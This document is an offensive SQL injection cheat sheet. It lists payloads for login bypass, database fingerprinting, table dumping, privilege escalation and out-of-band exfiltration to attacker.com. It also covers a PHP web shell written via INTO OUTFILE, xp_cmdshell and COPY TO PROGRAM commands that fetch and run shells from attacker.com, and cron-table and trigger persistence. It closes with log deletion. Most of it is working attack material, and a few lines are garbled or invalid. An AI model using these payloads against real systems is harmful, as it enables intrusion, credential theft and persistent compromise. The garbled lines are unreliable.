**SQL INJECTION CHEAT SHEET**

**Reconnaissance and entry points for SQL Injection**



**1. Common vulnerability entry points for SQLi**



Identify entry points using tools like \*\*burp, nmap, dirb, nikto, google dorks

&nbsp;	login forms

&nbsp;	search fields

&nbsp;	URL parameters (?id=1)

&nbsp;	HTTP headers (User-Agent, Referrer)

&nbsp;	cookies

&nbsp;	file upload forms



**2. Check for input validation**

Try basic payloads (', ", ;, --, '), ")to see application response to Look for error messages, unexpected behaviors or delays that may indicate SQLi vulnerability



**3. Test**

**To check if SQL injection is possible**

Try injecting into a parameter eg: product.asp?1d=4 (SMO) (NUMERIC)

&nbsp;	product.asp?id=5-1 (returns the result id=4)

&nbsp;	product.asp?id=4 OR 1=1

Trying to inject into product.asp?name=Book \*\*(STRING)\*\*

&nbsp;	product.asp?name=Bo'%2b'ok

&nbsp;	product.asp?name=Bo' || 'ok (only MO)

&nbsp;	product.asp?name=Book' OR 'x'='x



**Type of Database in use:**

Shutting down SQL Server 

&nbsp;	';shutdown --

inject error inducing payloads:

&nbsp;	' 

&nbsp;	" 

&nbsp;	') 

&nbsp;	") 

&nbsp;	OR 1=1

&nbsp;	' AND 1=CONVERT(int, 'a')--    -- For MSSQL



| Error Fragment                         | Likely DBMS         |

| -------------------------------------- | ------------------- |

| `You have an error in your SQL syntax` | MySQL               |

| `unclosed quotation mark`              | MSSQL               |

| `ORA-00933` or `ORA-00921`             | Oracle              |

| `syntax error at or near`              | PostgreSQL          |

| `SQLite3::SQLException`                | SQLite              |

| `MongoError` or `Unexpected token $`   | MongoDB / NoSQL     |



**Database Banner grabbing**

MySQL:	SELECT @@version;

&nbsp;	SELECT version();

&nbsp;	INSERT INTO members(id, user, pass) VALUES(1,''+SUBSTRING(@@version,1,10) ,10)

Input through URL parameter to reveal DB version

 	?id=1 UNION SELECT null, @@version -- -

MSSQL:	SELECT @@version;

&nbsp;	INSERT INTO members(id, user, pass) VALUES(1,''+SUBSTRING(@@version,1,10) ,10)

PostgreSQL: SELECT version();

&nbsp;	UNION SELECT NULL, version(), NULL

SQLite: sqlite\_version()

&nbsp;	UNION SELECT NULL, sqlite\_version(),NULL;

&nbsp;	SELECT version FROM PRODUCT\_COMPONENT\_VERSION WHERE product LIKE 'Oracle 	Database%';



Oracle: SELECT \* FROM v$version;

&nbsp;	Input through URL parameter to reveal DB version

&nbsp;	?id=1 UNION SELECT banner, null FROM v$version -- -



**Enumerate Database structure**

MySQL:

&nbsp;	UNION SELECT table\_name, null FROM information\_schema.tables WHERE 	table\_schema = 'target\_db' -- -

user-defined tables

&nbsp;	SELECT table\_name FROM information\_schema.tables WHERE table\_schema = 	'databasename'

column names:

&nbsp;	SELECT table\_name, column\_name FROM information\_schema.columns 	WHERE 	table\_name = 'tablename'



Oracle: 

&nbsp;	UNION SELECT table\_name, null FROM all\_tables -- -



PostgreSQL:

&nbsp;	UNION SELECT table\_name, null FROM information\_schema.tables WHERE table	\_schema = 'public' -- -



**user-defined tables:**

&nbsp;	SELECT \\\* FROM all\\\_tables WHERE OWNER = 'DATABASE\\\_NAME' column names:

&nbsp;	SELECT \\\* FROM all\\\_col\\\_comments WHERE TABLE\\\_NAME = 'TABLE'



**Error-based ways to discover column information**

**1. Finding column names using HAVING and GROUP BY (S)**



&nbsp;	' HAVING 1=1 -- (triggers error 1)

&nbsp;	' GROUP BY table.columnfromerror1 HAVING 1=1 -- (triggers error 2)

&nbsp;	' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- (triggers 	error 3)



&nbsp;	' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 	1=1 --

Once no more errors being shown you are done



**2. Testing for column number (MS0+)**

&nbsp;	?id=1 ORDER BY 1 -- 

&nbsp;	?id=1 ORDER BY 2 -- 

&nbsp;	?id=1 ORDER BY 3 -- 

&nbsp;	?id=1 ORDER BY n --

&nbsp;	If an error shows, you've found the number of columns



**3. Ways of finding the column type**

&nbsp;	' UNION SELECT sum(columntofind) from users-- (S)

If no error is displaying it means the column is numeric



You can also use cast() or convert() in a similar way, for example:

&nbsp;	SELECT \* FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, 	convert(image,1), null, null, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 	NULL, NULL--	



&nbsp;	11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –- 

No error—the syntax is correct and MS SQL Server is used. Proceeding.



&nbsp;	11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –- 

No error—we now know the first column is an integer.	



&nbsp;	11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 -- 

&nbsp;	Microsoft OLE DB Provider for SQL Server error '80040e07' 

&nbsp;	Explicit conversion from data type int to image is not allowed.

Error! The second column is not an integer.



&nbsp;	11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- 

No error—the second column is a string.	



&nbsp;	11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- 

Error! The third column is not an integer…

Rinse and repeat until you have all the column types mapped out.



**login forms injection**

&nbsp;	' OR '1'='1 --

&nbsp;	' OR '1'='1'-- -

&nbsp;	' OR 1=1 LIMIT 1-- -

&nbsp;	' OR '1'='1' --

&nbsp;	' OR 1=1 --

&nbsp;	" OR 1=1 --

&nbsp;	' OR '1'='1'/\\\*

&nbsp;	admin' --

&nbsp;	admin' OR '1'='1'#

&nbsp;	admin')-- -

&nbsp;	admin' --

&nbsp;	admin' # 

&nbsp;	admin'/\\\* 

&nbsp;	admin'-- 

&nbsp;	admin' or '1'='1

&nbsp;	admin' or true--

&nbsp;	admin') or ('1'='1-- -

 	admin") or ("1"="1"-- -

&nbsp;	' or true-- 

&nbsp;	' or 1=1-- 

&nbsp;	' or 1=1#

&nbsp;	' or 1=1/\\\*

&nbsp;	' or 1=1 LIMIT 1-- -

&nbsp;	' or 'a'='a

&nbsp;	' OR 1=1#

&nbsp;	' OR ''='



Payloads that bypass filtered characters

&nbsp;	OR 1=1

&nbsp;	OR TRUE

&nbsp;	OR 1=1-- -

&nbsp;	OR 1=1# 

&nbsp;	OR 1=1/\\\*

&nbsp;	OR 1 LIKE 1

&nbsp;	OR 1 BETWEEN 0 AND 2

&nbsp;	OR EXISTS(SELECT \\\* FROM users)



**Exfiltration \& pivoting** 

1. **Exfiltration techniques
   Data dumps (UNION SELECT)**
This is just a classic exfiltration	
   	?id=1 UNION SELECT id, username, password FROM users-- -
   if you know column count and types, you can dump entire tables.
   	sqlmap -u URL --dump --batch
   
2. **exfil sensitive configs**
   target values: AWS Keys, SMTP creds, API tokens, S3 buckets, internal IP/Domain
   	SELECT \* FROM config;
   	SELECT \* FROM settings;
   	SELECT \* FROM env;
   	SELECT value FROM settings WHERE key LIKE '%secret%';
   
3. **Out-of-Band exfil**
   Used in blind SQLi, great for stealth and bypassing WAFs
   **MySQL DNS-based:**
   	LOAD\_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'\\\\.attacker.com\\\\'));
   **MSSQL:**
   	exec xp\_dirtree '\\\\attacker.com\\share'
   **PostgreSQL:**
   	COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/data.txt'
   
4. **Boolean/time-based blind exfil**
   If UNION/errors don’t work:
   	1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a'-- -
   **Automate with:**
   	sqlmap -u URL --technique=T --dbs
   

**Pivoting and lateral movement**

In the application layer(SQL Access) look for ways to:

* steal more credentials(RDS, Redis, SMTP)
* write to disk (RCE)
* Access other internal services
* poison internal cache or jobs



1. **credential extraction-pivot**
   Look for:
   	SELECT \* FROM users;
   	SELECT \* FROM environment;
   	SELECT \* FROM credentials;
   Find SMTP/Redis/AWS keys:
   	aws\_access\_key=AKIA....
   	smtp://username:password@mail.internal
   if creds found try logging into: 
   	Internal admin panels
   	S3 buckets
   	SSH or FTP (if creds found)
   	Database consoles
   
2. **RCE via SQLi (File Write/ Function Abuse)**
   If you can write files:
   **MySQL (Linux/PHP):**
   	UNION SELECT "<?php system($\_GET\['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
   then: GET /shell.php?cmd=whoami
   **MSSQL:**
   	exec xp\_cmdshell 'powershell -enc ...'
   
3. **Access other internal systems(service pivot)**
   Use SQLi to:
   	Dump internal subdomains:
   		SELECT host FROM logs WHERE referrer LIKE '%internal%'
   	Pivot to Redis
   	  if Redis is reachable and unauthenticated, poison it:
   		SET CONFIG rewrite-command 'FLUSHALL' 'GETFLAG'
   	Poison scheduled jobs or cron via DB injections:
   		INSERT INTO cron (cmd) VALUES ('curl http://attacker.com/shell.sh | bash');
   
4. **GraphQL/API Endpoint Pivot**
   Found an internal API? Abuse SQLi in it:
   query {
    user(id: "1' UNION SELECT password FROM users--") {
       id
     }
   }
   
5. **Steal session/Auth Tokens**
   	SELECT token, ip FROM sessions;
   or:
   	SELECT cookie FROM analytics\_logs;
   then Replay:
   	Cookie: session=stolen\_token



### **SQLi Exploitation Flow (Textual Flowchart)**



\[1] Entry Point Discovery

&nbsp;    └─► Scan input vectors (forms, URLs, headers, cookies, GraphQL)

&nbsp;          └─► Check for injectable parameters (manual or with tools like sqlmap, Burp)



\[2] Initial SQL Injection

&nbsp;    └─► Test for authentication bypass or query manipulation

&nbsp;          └─► Bypass login with ' OR '1'='1

&nbsp;          └─► Trigger DB errors or anomalies (timing, boolean)



\[3] DBMS Fingerprinting

&nbsp;    └─► Extract database type/version

&nbsp;          └─► SELECT @@version / version()

&nbsp;          └─► sqlmap --banner



\[4] Table \& Column Enumeration

&nbsp;    └─► Find structure of DB

&nbsp;          └─► sqlmap --tables / --columns

&nbsp;          └─► Manually with UNION SELECT or information\_schema



\[5] Data Exfiltration

&nbsp;    └─► Dump sensitive data (users, passwords, tokens, emails)

&nbsp;          └─► sqlmap --dump

&nbsp;          └─► UNION SELECT username, password FROM users

&nbsp;          └─► Blind SQLi (boolean/time-based inference)



\[6] Privilege Escalation

&nbsp;    └─► Modify user roles or inject new admin

&nbsp;          └─► UPDATE users SET is\_admin=1 WHERE username='guest'

&nbsp;          └─► INSERT INTO users (...) VALUES (...)



\[7] Remote Code Execution (RCE)

&nbsp;    └─► Write to file or abuse DB functions

&nbsp;          └─► MySQL: SELECT "<?php system($\_GET\['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'

&nbsp;          └─► MSSQL: xp\_cmdshell 'powershell reverse shell'



\[8] Lateral Movement

&nbsp;    └─► Access other services using stolen credentials

&nbsp;          └─► SSH, SMB, admin panels, internal APIs

&nbsp;          └─► Pivot to other DBs or machines



\[9] Cloud \& Infra Pivoting

&nbsp;    └─► Exfiltrate API keys (AWS, GCP, Azure) or secrets

&nbsp;          └─► SELECT \* FROM env WHERE key LIKE '%key%'

&nbsp;          └─► Access cloud storage (S3, buckets, RDS)

&nbsp;          └─► Exploit misconfigured services (Redis, Jenkins, Docker)



\[10] Persistence

&nbsp;    └─► Create backdoor accounts

&nbsp;          └─► INSERT INTO users (admin) ...

&nbsp;    └─► Set scheduled jobs or cron tasks

&nbsp;          └─► Inject reverse shell into cron or task scheduler

&nbsp;    └─► Webshell deployment or DB triggers



\[11] Cleanup (Optional in red team or stealth testing)

&nbsp;    └─► Remove logs, drop shell, disable accounts

&nbsp;          └─► DELETE FROM logs WHERE user='attacker'



### **PoC Payloads: Steps 5–9**

**Step 5: Data Exfiltration**

**MySQL:** ?id=1 UNION SELECT username, password FROM users-- -

**MSSQL:** ?id=1; SELECT name, pass FROM members--

**PostgreSQL:** ?id=1 UNION SELECT username || ':' || password FROM auth\_table--

**Blind SQLi (Time-Based - MySQL)**

&nbsp;	?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)-- -



**Step 6: Privilege Escalation**

Set Yourself as Admin

&nbsp;	'; UPDATE users SET role='admin' WHERE username='guest';--

Add a New Admin User (MySQL)

&nbsp;	'; INSERT INTO users (username, password, role) VALUES ('haxor', '123456', 'admin');--

MSSQL Escalation via Stacked Queries

&nbsp;	'; EXEC sp\_addlogin 'haxor', 'Password123!'; EXEC sp\_addsrvrolemember 'haxor', 'sysadmin';--



**Step 7: Remote Code Execution (RCE)**

MySQL – Write Web Shell

&nbsp;	?id=1 UNION SELECT "<?php system($\\\_GET\\\['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -

PostgreSQL – Command Execution

&nbsp;	COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash';

MSSQL – Using xp\_cmdshell

&nbsp;	'; EXEC xp\_cmdshell 'powershell -Command "Invoke-WebRequest http://attacker.com/shell.exe -OutFile C:\\\\shell.exe \&\& Start-Process C:\\\\shell.exe"';--

Prerequisite: xp\_cmdshell must be enabled.



**Step 8: Lateral Movement**

Enumerate Internal Services (from logs)

&nbsp;	UNION SELECT DISTINCT ip\_address FROM logs WHERE url LIKE '%admin%'-- -

Extract AWS Keys

&nbsp;	SELECT config\_value FROM config WHERE config\_key LIKE '%aws%' OR config\_key LIKE '%s3%';

Poison Internal Job Queue (Redis-style)

&nbsp;	INSERT INTO job\_queue (task) VALUES ('curl http://attacker.com/malware.sh | bash');

Reuse Creds in Internal Admin Panel (if auth table leaked)

&nbsp;	POST /admin/login

&nbsp;	username=haxor\&password=stolenpass



**Step 9: Persistence**

Add a New Web Admin

&nbsp;	INSERT INTO users (username, password, role) VALUES ('backdoor', 'pass123', 'admin');

Inject into Cron Job Table

&nbsp;	INSERT INTO cron\_jobs (command, schedule) VALUES ('wget http://attacker.com/rev.sh | bash', '\* \* \* \* \*');

Create a DB Trigger for Auto-Reexecution

&nbsp;	CREATE TRIGGER persist AFTER INSERT ON users

&nbsp;	FOR EACH ROW BEGIN

    		CALL system('curl http://attacker.com/revive.sh | sh');

&nbsp;	END;



